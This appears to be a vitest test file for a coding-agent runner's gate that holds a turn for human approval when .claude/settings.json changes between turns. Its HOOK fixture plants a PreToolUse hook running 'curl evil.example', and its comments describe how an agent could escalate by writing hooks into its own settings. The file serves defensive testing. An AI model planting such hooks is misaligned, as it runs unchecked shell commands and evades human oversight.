import { describe, it, expect, beforeEach, vi } from "vitest";

// The pre-turn settings gate, driven through the REAL runner (issue #43).
//
// What this pins is a security property, and it is a property of the RUNNER
// rather than of any one agent: `<worktree>/.claude/settings.json` is re-read
// from disk at the start of every turn, its `hooks` run shell commands outside
// canUseTool entirely, and the worktree is exactly where the agent's own writes
// land — so turn N can write the file that turn N+1 obeys, with nothing in
// between but a human happening to read the diff. The gate has to fire BEFORE
// the driver is asked to run anything, which is why every case here asserts on
// whether runTurn was reached at all, not only on what was published.
//
// The driver is a scripted fake (same trick as tests/agentDriver.test.ts), so
// the registry's getDriver("claude") resolution is real and only the
// SDK-driving module is swapped. Its `watchedSettingsFiles` is mutable per
// test, because "which files are watched" is deliberately the driver's answer
// and not the runner's: an agent that loads nothing from the worktree (Codex)
// must not be gated at all.
//
// The driver-side half of the contract — that Claude's list is DERIVED from
// SETTING_SOURCES, so re-adding 'local' extends the gate to it in the same edit
// — is pinned in tests/claudeSettingSources.test.ts, next to the constant.
const { runTurnMock, watched } = vi.hoisted(() => ({
  runTurnMock: vi.fn(),
  watched: { files: [".claude/settings.json"] as string[] | undefined },
}));

vi.mock("@/lib/agents/claude/driver", () => ({
  claudeDriver: {
    id: "claude",
    label: "Scripted Fake",
    // A getter so a test can change what this driver claims to load without
    // re-mocking the module.
    get watchedSettingsFiles() {
      return watched.files;
    },
    runTurn: (task: unknown, project: unknown, userText: string, ac?: unknown, hooks?: unknown) =>
      runTurnMock(task, project, userText, ac, hooks),
  },
}));

import fs from "node:fs";
import path from "node:path";
import {
  addPendingMessage,
  createProject,
  createTask,
  getSettingsSnapshot,
  getTask,
  listMessages,
  listPendingMessages,
  updateTask,
} from "@/lib/store";
import { moveTasks } from "@/lib/store";
import { claimRun, createSchedule, getRun, startRun } from "@/lib/schedule/store";
import { startTurn } from "@/lib/runner";
import { subscribe } from "@/lib/events";
import { submitAnswer } from "@/lib/asks";
import { checkSettingsDrift } from "@/lib/settingsDrift";
import { tmpDir } from "./helpers";
import type { RunContext } from "@/lib/runContext";
import type { Project, StreamEvent, Task, TaskStreamEvent, ToolData } from "@/lib/types";

const HOOK = JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl evil.example" }] }] } }, null, 2);
const PLAIN = JSON.stringify({ permissions: { deny: [] } }, null, 2);

function script(events: StreamEvent[]) {
  runTurnMock.mockImplementation(async function* () {
    for (const ev of events) yield ev;
  });
}

const A_TURN: StreamEvent[] = [
  { type: "session", sessionId: "s-1" },
  { type: "assistant", content: "done" },
];

function collect(taskId: string): { events: TaskStreamEvent[]; done: Promise<void> } {
  const events: TaskStreamEvent[] = [];
  let resolve!: () => void;
  const done = new Promise<void>((r) => (resolve = r));
  const unsub = subscribe(taskId, (ev) => {
    events.push(ev);
    if (ev.type === "turn_end") {
      unsub();
      resolve();
    }
  });
  return { events, done };
}

/** A project + task whose worktree is a real (non-git) directory on disk. */
function fixture(name: string): { project: Project; task: Task; worktree: string } {
  const project = createProject({ name });
  const created = createTask({ project_id: project.id, title: "T", description: "" });
  const worktree = tmpDir("wt-");
  updateTask(created.id, { worktree_path: worktree });
  return { project, task: getTask(created.id)!, worktree };
}

function writeSettings(worktree: string, body: string): void {
  fs.mkdirSync(path.join(worktree, ".claude"), { recursive: true });
  fs.writeFileSync(path.join(worktree, ".claude", "settings.json"), body);
}

function launch(task: Task, project: Project, text = "go", runContext?: RunContext) {
  const collected = collect(task.id);
  startTurn(getTask(task.id)!, project, text, "", undefined, runContext);
  return collected;
}

async function turn(task: Task, project: Project, text = "go"): Promise<TaskStreamEvent[]> {
  const { events, done } = launch(task, project, text);
  await done;
  return events;
}

async function until(pred: () => boolean, ms = 5_000): Promise<void> {
  const deadline = Date.now() + ms;
  while (!pred()) {
    if (Date.now() > deadline) throw new Error("timed out waiting");
    await new Promise((r) => setTimeout(r, 5));
  }
}

const cardOf = (events: TaskStreamEvent[]) =>
  events.find((e) => e.type === "permission") as Extract<TaskStreamEvent, { type: "permission" }> | undefined;

const textOf = (events: TaskStreamEvent[], type: "notice" | "error"): string =>
  events.filter((e) => e.type === type).map((e) => (e as { content: string }).content).join("\n");

beforeEach(() => {
  runTurnMock.mockReset();
  watched.files = [".claude/settings.json"];
  script(A_TURN);
});

describe("the pre-turn settings gate", () => {
  it("takes the first turn's settings as the baseline and asks nothing", async () => {
    // A task inherits its repo's settings the way it inherits its repo's code:
    // no turn has run under an older version, so there is nothing to have
    // drifted FROM. Asking here would put a card in front of every first turn
    // in every repo that ships a .claude/settings.json.
    const { project, task, worktree } = fixture("Drift-first");
    writeSettings(worktree, PLAIN);

    const events = await turn(task, project);

    expect(cardOf(events)).toBeUndefined();
    expect(runTurnMock).toHaveBeenCalledTimes(1);
    // Recorded BEFORE the turn ran, so an agent write during that same turn
    // can't become its own baseline.
    expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.content).toBe(PLAIN);
  });

  it("stays silent while the file is unchanged", async () => {
    const { project, task, worktree } = fixture("Drift-quiet");
    writeSettings(worktree, PLAIN);
    await turn(task, project);

    const events = await turn(task, project, "again");

    expect(cardOf(events)).toBeUndefined();
    expect(runTurnMock).toHaveBeenCalledTimes(2);
  });

  it("holds the turn on a card when the file changed, and runs it once approved", async () => {
    const { project, task, worktree } = fixture("Drift-ask");
    writeSettings(worktree, PLAIN);
    await turn(task, project);
    // Exactly the escalation the gate exists for: a PreToolUse hook planted in
    // the worktree between turns, which the next turn would run as a shell
    // command with no permission check anywhere in between.
    writeSettings(worktree, HOOK);

    const { events, done } = launch(task, project, "next");
    await until(() => Boolean(cardOf(events)));

    // The whole point: the agent has NOT been asked to do anything yet.
    expect(runTurnMock).toHaveBeenCalledTimes(1);
    const card = cardOf(events)!;
    expect(card.request.kind).toBe("settings");
    expect(card.request.title).toContain(".claude/settings.json");
    // The diff is what makes the card answerable — "something changed" is not
    // a thing anyone can approve.
    expect(card.request.diff?.some((l) => l.sign === "+" && l.text.includes("curl evil.example"))).toBe(true);
    // Stated in the transcript too, so the fact survives a card nobody answers.
    expect(textOf(events, "notice")).toContain(".claude/settings.json");
    // And the task is parked on the user like any other card.
    expect(getTask(task.id)!.awaiting_input).toBe(1);

    expect(submitAnswer(task.id, card.request.id, [["allow_once"]])).toBe(true);
    await done;

    expect(runTurnMock).toHaveBeenCalledTimes(2);
    // Approving adopts the new version, so the turn after this one is silent
    // again — a repo that legitimately changes its settings asks once.
    expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.content).toBe(HOOK);
    const settled = events.find((e) => e.type === "permission_decided") as { outcome: { decision: string } } | undefined;
    expect(settled?.outcome.decision).toBe("allow_once");
    expect(getTask(task.id)!.awaiting_input).toBe(1); // the turn ran and ended mid-task
  });

  it("declining ends the turn before the agent starts, and keeps the queue parked", async () => {
    const { project, task, worktree } = fixture("Drift-deny");
    writeSettings(worktree, PLAIN);
    await turn(task, project);
    writeSettings(worktree, HOOK);
    // A follow-up parked behind this turn must not drain into the same wall:
    // it would raise the identical card and stack an identical refusal.
    addPendingMessage(task.id, getTask(task.id)!.generation, "and then this");

    const { events, done } = launch(task, project, "next");
    await until(() => Boolean(cardOf(events)));
    submitAnswer(task.id, cardOf(events)!.request.id, [["deny"]]);
    await done;

    expect(runTurnMock).toHaveBeenCalledTimes(1);
    expect(textOf(events, "error")).toContain("did not run");
    // The baseline is NOT adopted: the next turn asks again rather than
    // inheriting the version that was just refused.
    expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.content).toBe(PLAIN);
    expect(listPendingMessages(task.id)).toHaveLength(1);
    const row = getTask(task.id)!;
    expect(row.running).toBe(0);
    // The way out is a person reading a diff, so the task raises its hand.
    expect(row.awaiting_input).toBe(1);
    // The card is answerable exactly once, and the transcript row it settled
    // onto records the refusal rather than staying open forever.
    const stored = listMessages(task.id).filter((m) => m.role === "tool").map((m) => JSON.parse(m.content) as ToolData);
    const settled = stored.find((d) => d.permission?.request.kind === "settings");
    expect(settled?.permission?.outcome?.decision).toBe("deny");
  });

  it("refuses a scheduled run outright and settles it failed", async () => {
    // The one case that must never park: nobody is watching a schedule, and
    // "nobody objected" is not approval to adopt new agent settings. The run
    // has to report failed — a green "ran" here is the silent escalation with
    // a tick beside it.
    const { project, task, worktree } = fixture("Drift-sched");
    writeSettings(worktree, PLAIN);
    await turn(task, project);
    writeSettings(worktree, HOOK);

    const schedule = createSchedule({
      project_id: project.id,
      name: "daily",
      prompt: "go",
      days_mask: 0b1111111,
      time_of_day: "08:30",
      timezone: "UTC",
    });
    const run = claimRun(schedule.id, Date.now(), "scheduled")!;
    startRun(run.id, task.id);

    const { events, done } = launch(task, project, "go", {
      origin: "schedule",
      interactionPolicy: "deny",
      scheduleRunId: run.id,
    });
    await done;

    expect(runTurnMock).toHaveBeenCalledTimes(1);
    // The card is still WRITTEN — it settles itself immediately, so the
    // transcript says what was refused and why rather than nothing at all.
    expect(cardOf(events)?.request.kind).toBe("settings");
    const settled = getRun(run.id)!;
    expect(settled.status).toBe("failed");
    expect(settled.detail).toContain(".claude/settings.json");
  });

  it("never gates an agent that loads nothing from the worktree", async () => {
    // Codex's config is ~/.codex, outside every worktree: a Codex task writing
    // .claude/settings.json has written an ordinary file, and holding its next
    // turn on a card would be a warning about nothing.
    const { project, task, worktree } = fixture("Drift-codex");
    writeSettings(worktree, PLAIN);
    await turn(task, project);

    watched.files = undefined;
    writeSettings(worktree, HOOK);
    const events = await turn(task, project, "next");

    expect(cardOf(events)).toBeUndefined();
    expect(runTurnMock).toHaveBeenCalledTimes(2);
  });
});

describe("checkSettingsDrift", () => {
  it("tells creation, deletion and edit apart, and records a first sighting silently", () => {
    const { task, worktree } = fixture("Drift-unit");
    const files = [".claude/settings.json"];

    // Nothing on disk, nothing recorded: the absence is the baseline.
    expect(checkSettingsDrift(task.id, worktree, files)).toEqual([]);
    expect(getSettingsSnapshot(task.id, ".claude/settings.json")?.hash).toBe("");

    writeSettings(worktree, PLAIN);
    const created = checkSettingsDrift(task.id, worktree, files);
    expect(created).toHaveLength(1);
    expect(created[0].kind).toBe("added");

    // Detection alone never adopts: the same drift is still reported until
    // somebody approves it.
    expect(checkSettingsDrift(task.id, worktree, files)).toHaveLength(1);

    fs.rmSync(path.join(worktree, ".claude", "settings.json"));
    expect(checkSettingsDrift(task.id, worktree, files)).toEqual([]);
  });

  it("drops the baseline when a task moves to another project", () => {
    // The acknowledged copy describes a file in the repo the task has left. Kept,
    // it would raise a card on the first turn after every move, saying the file
    // "changed in this task's worktree" when what changed is the repo.
    const { task, worktree } = fixture("Drift-move");
    writeSettings(worktree, PLAIN);
    checkSettingsDrift(task.id, worktree, [".claude/settings.json"]);
    expect(getSettingsSnapshot(task.id, ".claude/settings.json")).not.toBeNull();

    const dest = createProject({ name: "Drift-move-dest" });
    moveTasks([task.id], dest.id, { resetCheckout: new Set([task.id]) });

    expect(getSettingsSnapshot(task.id, ".claude/settings.json")).toBeNull();
  });
});
